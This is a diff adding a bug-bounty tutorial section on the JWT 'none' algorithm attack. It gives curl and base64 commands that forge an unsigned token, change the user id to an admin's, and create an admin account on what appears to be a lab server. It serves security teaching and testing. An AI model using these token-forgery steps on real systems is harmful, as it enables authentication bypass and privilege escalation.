@@ -1587,3 +1587,135 @@ Because of these risks, it’s always a good idea to **test for unverified signa
 Exploiting unverified JWT signatures is a critical vulnerability that allows attackers to bypass authentication mechanisms, impersonate users, and access sensitive information. This vulnerability often arises from improper configuration or a lack of understanding of how JWTs should be securely handled.
 
 As bug bounty researchers we should always test for this type of vulnerability when we find jwts are being used by manipulating and forging them to see if the server properly validates their signatures.
+
+### Exploiting the JWT "None" Algorithm Attack
+
+This is a well-known attack in the world of JWT-based authentication, where the server improperly accepts a JWT signed with an **unsigned** algorithm (`"none"`), bypassing the need for signature verification altogether.
+
+#### What Is the "None" Algorithm?
+
+The `"none"` algorithm in JWTs is an unsigned token, meaning that no cryptographic signature is used to verify the integrity of the token. The **signature** is typically used to ensure that the JWT’s payload hasn’t been tampered with. However, when the algorithm is set to `"none"`, the server should ideally reject this token since it lacks a signature and can be modified freely.
+
+In some cases, poorly configured or vulnerable JWT libraries may accept `"none"` as a valid algorithm, allowing attackers to **bypass signature verification** and manipulate the payload. This can lead to serious security vulnerabilities such as privilege escalation, unauthorized access, or even arbitrary data modifications.
+
+Let’s walk through an example where we test for the `"none"` algorithm attack on a server that uses JWT for authentication.
+
+![jwt14](images/jwt/14.png)
+
+#### Step 1: Obtain a JWT for a Low Privilege User
+
+First, we authenticate as a low-privilege user (e.g., `elliot`) using the following `curl` command:
+
+```bash
+curl -H "Content-Type: application/json" -X POST -d '{"identifier":"elliot","password":"elliotalderson"}' http://192.194.183.3:1337/auth/local/ | jq
+```
+
+This command sends the username and password to the authentication endpoint and returns a JWT token, which is typically used for subsequent requests. We’ll extract the JWT from the response.
+
+![jwt15](images/jwt/15.png)
+
+#### Step 2: Attempt to Tamper with the Signature
+
+Next, we try to tamper with the signature part of the JWT. This is the third part of the token (after the header and payload). However, when we send the modified token back to the server, it is rejected because the signature is not valid anymore, and the server checks for this.
+
+#### Step 3: Modify the Algorithm to `"none"`
+
+Since tampering with the signature doesn’t work, we test the `"none"` algorithm attack. The idea is to modify the JWT’s **header** to indicate that it uses the `"none"` algorithm. If the server is vulnerable, it will accept the modified JWT without signature verification.
+
+1. **Decode the Header and Payload**
+
+   We start by decoding the JWT to inspect the header and payload. The JWT format consists of three parts: the header, the payload (claims), and the signature.
+
+   The header of the JWT looks like this (before tampering):
+
+   ```json
+   {
+     "alg": "HS256",
+     "typ": "JWT"
+   }
+   ```
+
+   The payload looks like this:
+
+   ```json
+   {
+     "id": 2,
+     "iat": 1739112845
+   }
+   ```
+
+![jwt16](images/jwt/16.png)
+
+2. **Modify the Header to Use "none"**
+
+   To exploit this vulnerability, we change the `alg` in the header to `"none"`. This will indicate that the token is unsigned, meaning no signature is required for verification.
+
+   Use the following `base64` commands to encode the new header and payload:
+
+   ```bash
+   echo '{"alg":"none","typ":"JWT"}' | base64
+   ```
+
+   ```bash
+   echo '{"id":"1","iat":1739112845}' | base64
+   ```
+
+   In this case, we assume that the `id` value of `1` corresponds to an admin user (since `id: 2` was our low-priv user). Changing `id: 2` to `id: 1` is our attempt to elevate privileges.
+
+![jwt17](images/jwt/17.png)
+
+3. **Construct the New Token**
+
+   Now, we combine the base64-encoded header and payload, separated by a period (`.`). Don’t forget to **remove the `=` padding** at the end of the base64-encoded strings.
+
+   The forged token would look something like this:
+
+   ```
+   <base64_header>.<base64_payload>.
+   ```
+
+>[!IMPORTANT]
+>Even when sending a jwt with **no signature** we still need to **include the second .** after the payload
+
+![jwt18](images/jwt/18.png)
+
+4. **Use the Forged Token**
+
+   Finally, we use `curl` to send a request to the server with the forged JWT in the `Authorization` header:
+
+   ```bash
+   curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer <forged_token>" http://192.194.183.3:1337/users -d '{"username":"test","email":"test@test.com","password":"password","role":"1"}' | jq
+   ```
+
+   The server is vulnerable to the `"none"` algorithm attack, so we find this request succeeds in creating a new admin user. After that, we can log in as the new admin and perform privileged actions.
+
+![jwt19](images/jwt/19.png)
+
+#### Why Does This Attack Work?
+
+The **"none" algorithm attack** works because some JWT libraries or server configurations improperly accept JWTs with the `alg` set to `"none"`, effectively bypassing signature verification. This vulnerability arises when the server doesn’t properly check the `alg` value or fails to reject unsigned tokens.
+
+#### Why We Test for the "None" Algorithm
+
+Testing for the `"none"` algorithm attack is important because it can completely bypass the security of JWT-based authentication. If this vulnerability exists, attackers can:
+
+- **Modify the payload** to impersonate other users or gain unauthorized access to restricted resources.
+- **Bypass signature verification** entirely, even if the server is supposed to use a secret key or a public/private key pair for signing the JWT.
+
+#### Why This Attack is Sometimes Possible
+
+This attack can occur because some libraries **incorrectly handle** the `"none"` algorithm. While it should be treated as an **invalid algorithm** for security reasons, some libraries or server configurations may accept it if the implementation is not robust or if the signature verification process is flawed.
+
+#### Tools You Can Use
+
+While online tools like [JWT.io](https://jwt.io/) or [jwt_tool](https://github.com/ticarpi/jwt_tool) are commonly used for inspecting and crafting JWTs, it’s important to note that **you can perform these actions with basic command-line tools** such as `curl` and `base64`:
+
+- **`curl`** for making HTTP requests (e.g., to interact with APIs or send tokens).
+- **`base64`** for encoding and decoding JWT parts (header and payload).
+- **`jq`** for formatting and parsing JSON responses.
+
+You **don’t need** to rely on online tools to test for vulnerabilities. Using command-line tools ensures that you’re working in a more controlled and potentially safer environment, especially when dealing with sensitive security tests.
+
+#### Conclusion
+
+The **"none" algorithm attack** is a serious vulnerability in JWT authentication systems that can allow attackers to **bypass signature verification** and manipulate the payload. It often happens due to improper handling of the `"none"` algorithm, either by the server or the JWT library in use. Testing for this vulnerability is crucial for ensuring that JWT authentication is properly secured, and tools like `curl` and `base64` allow you to easily test for such vulnerabilities without relying on online services.
